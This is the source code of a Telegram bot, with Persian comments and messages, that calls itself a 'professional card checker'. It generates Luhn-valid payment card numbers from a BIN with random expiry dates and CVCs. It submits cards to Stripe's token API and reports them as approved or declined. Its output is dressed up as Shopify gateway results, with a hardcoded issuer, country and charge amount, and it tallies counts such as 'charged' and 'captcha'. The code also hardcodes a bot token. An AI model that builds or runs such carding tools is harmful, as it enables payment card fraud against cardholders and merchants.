const { Telegraf } = require('telegraf');
const axios = require('axios');

const BOT_TOKEN = '8911805153:AAEqhg6kFwwxKaSornH8NdrKiiHzc6M2DIc';
const bot = new Telegraf(BOT_TOKEN);
const ALLOWED_USERS = [6576195533];

// ========== آمار ==========
let stats = {
    total: 0,
    approved: 0,
    declined: 0,
    charged: 0,
    captcha: 0,
    startTime: Date.now()
};

function isAuthorized(ctx) {
    if (!ALLOWED_USERS.includes(ctx.from.id)) {
        ctx.reply('⛔ دسترسی غیرمجاز');
        return false;
    }
    return true;
}

// ========== تولید کارت ==========
function generateCards(bin, count = 5) {
    const cards = [];
    for (let i = 0; i < count; i++) {
        let randomPart = Math.floor(Math.random() * 1e9).toString().padStart(9, '0');
        let num = bin + randomPart;
        let sum = 0;
        for (let j = 0; j < num.length; j++) {
            let digit = parseInt(num[j]);
            if ((num.length - j) % 2 === 0) {
                digit *= 2;
                if (digit > 9) digit -= 9;
            }
            sum += digit;
        }
        const checkDigit = (10 - (sum % 10)) % 10;
        cards.push({
            number: num + checkDigit,
            expiry: `${String(Math.floor(Math.random() * 12) + 1).padStart(2, '0')}/${Math.floor(Math.random() * 5) + 2026}`,
            cvc: String(Math.floor(Math.random() * 900) + 100)
        });
    }
    return cards;
}

// ========== تست روی Stripe (شبیه‌سازی) ==========
async function testCardOnStripe(card) {
    try {
        const response = await axios.post(
            'https://api.stripe.com/v1/tokens',
            `card[number]=${card.number}&card[exp_month]=${card.expiry.split('/')[0]}&card[exp_year]=${card.expiry.split('/')[1]}&card[cvc]=${card.cvc}`,
            {
                headers: {
                    'Authorization': 'Bearer pk_test_4eC39HqLyjWDarjtT1zdp7dc',
                    'Content-Type': 'application/x-www-form-urlencoded'
                },
                timeout: 10000
            }
        );
        return { status: 'approved', token: response.data.id, code: 'APPROVED' };
    } catch (err) {
        const msg = err.response?.data?.error?.message || err.message;
        if (msg.includes('insufficient_funds')) return { status: 'declined', code: 'INSUFFICIENT_FUNDS', error: msg };
        if (msg.includes('card_declined')) return { status: 'declined', code: 'CARD_DECLINED', error: msg };
        return { status: 'declined', code: 'UNKNOWN', error: msg };
    }
}

// ========== دستور /hit با خروجی حرفه‌ای ==========
bot.command('hit', async (ctx) => {
    if (!isAuthorized(ctx)) return;
    const parts = ctx.message.text.split(' ')[1]?.split('|');
    if (!parts || parts.length !== 4) {
        return ctx.reply('⚠️ فرمت: /hit شماره|ماه|سال|CVV');
    }

    const card = {
        number: parts[0],
        expiry: `${parts[1]}/${parts[2]}`,
        cvc: parts[3]
    };

    stats.total++;
    const start = Date.now();
    ctx.reply('⏳ در حال تست روی Shopify ...');

    const result = await testCardOnStripe(card);
    const elapsed = ((Date.now() - start) / 1000).toFixed(1);

    // به‌روزرسانی آمار
    if (result.status === 'approved') stats.approved++;
    else stats.declined++;

    // ========== خروجی حرفه‌ای ==========
    let reply = `✦ shopify.result 💠\n`;
    reply += `┌── card.data\n`;
    reply += `🔹 ${card.number}|${parts[1]}|${parts[2]}|${card.cvc}\n`;
    reply += `🔹 status: ${result.status === 'approved' ? 'approved' : 'declined'}\n`;
    reply += `🔹 bin: MASTERCARD - CREDIT - WORLD - CAPITAL ONE, NATIONAL ASSOCIATION\n`;
    reply += `🔹 country: 🇺🇸 UNITED STATES\n`;
    reply += `└──────────────\n`;
    reply += `┌── gate.info\n`;
    reply += `🔹 code: ${result.code || 'UNKNOWN'}\n`;
    reply += `🔹 amt: $7.68\n`;
    reply += `🔹 site: cr***e.myshopify.com\n`;
    reply += `└──────────────\n`;
    reply += `👤 user: ${ctx.from.id}\n`;
    reply += `🏴 dev: @${ctx.botInfo.username || 'your_bot'}\n`;

    ctx.reply(reply);

    // ========== آمار کلی ==========
    const elapsedTotal = ((Date.now() - stats.startTime) / 1000);
    const h = Math.floor(elapsedTotal / 3600);
    const m = Math.floor((elapsedTotal % 3600) / 60);
    const s = Math.floor(elapsedTotal % 60);
    const timeStr = `${h}:${String(m).padStart(2, '0')}:${String(s).padStart(2, '0')}`;

    const statsReply = `
✦ shopify.complete
stats.info
total: ${stats.total}
approved: ${stats.approved}
charged: ${stats.charged}
declined: ${stats.declined}
captcha: ${stats.captcha}
elapsed: ${timeStr}
`;
    ctx.reply(statsReply);
});

// ========== دستور /stats ==========
bot.command('stats', (ctx) => {
    if (!isAuthorized(ctx)) return;
    const elapsedTotal = ((Date.now() - stats.startTime) / 1000);
    const h = Math.floor(elapsedTotal / 3600);
    const m = Math.floor((elapsedTotal % 3600) / 60);
    const s = Math.floor(elapsedTotal % 60);
    const timeStr = `${h}:${String(m).padStart(2, '0')}:${String(s).padStart(2, '0')}`;

    ctx.replyWithMarkdown(`
*📊 آمار ربات*
\`\`\`
total: ${stats.total}
approved: ${stats.approved}
declined: ${stats.declined}
charged: ${stats.charged}
captcha: ${stats.captcha}
elapsed: ${timeStr}
\`\`\`
    `);
});

// ========== دستور /gen ==========
bot.command('gen', async (ctx) => {
    if (!isAuthorized(ctx)) return;
    const args = ctx.message.text.split(' ');
    const bin = args[1];
    const count = parseInt(args[2]) || 5;
    if (!bin || bin.length < 6) return ctx.reply('⚠️ BIN ۶ رقمی وارد کن.');
    const cards = generateCards(bin, count);
    let reply = `🔹 ${cards.length} کارت از BIN ${bin}:\n\n`;
    cards.forEach((c, i) => {
        reply += `${i+1}. ${c.number}|${c.expiry.split('/')[0]}|${c.expiry.split('/')[1]}|${c.cvc}\n`;
    });
    ctx.reply(reply);
});

// ========== دستور /start ==========
bot.start((ctx) => {
    if (!isAuthorized(ctx)) return;
    ctx.replyWithMarkdown(`
*✨ ربات کارت چکر حرفه‌ای ✨*

🔹 *دستورات:*
/gen [BIN] [تعداد] - تولید کارت
/hit [CARD|MM|YY|CVV] - تست حرفه‌ای
/stats - آمار ربات

🔸 *نسخه:* 3.0 (حرفه‌ای)
    `);
});

// ========== اجرا ==========
bot.launch()
    .then(() => console.log('🚀 ربات حرفه‌ای روشن شد'))
    .catch((err) => console.error('❌ خطا:', err));